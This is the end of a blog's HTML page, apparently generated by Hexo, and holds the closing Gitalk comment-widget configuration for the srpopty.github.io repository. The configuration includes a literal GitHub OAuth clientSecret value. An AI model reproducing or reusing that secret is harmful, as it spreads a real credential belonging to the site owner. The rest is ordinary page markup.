      clientSecret: '7b3efe103d7e694008b943a67e5273ad36ee14a0',
      repo        : 'srpopty.github.io',
      owner       : 'Srpopty',
      admin       : ['Srpopty'],
      id          : '037e13ded5de88b8deb6ded4ca7aa118',
        language: 'en',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</body>
</html>
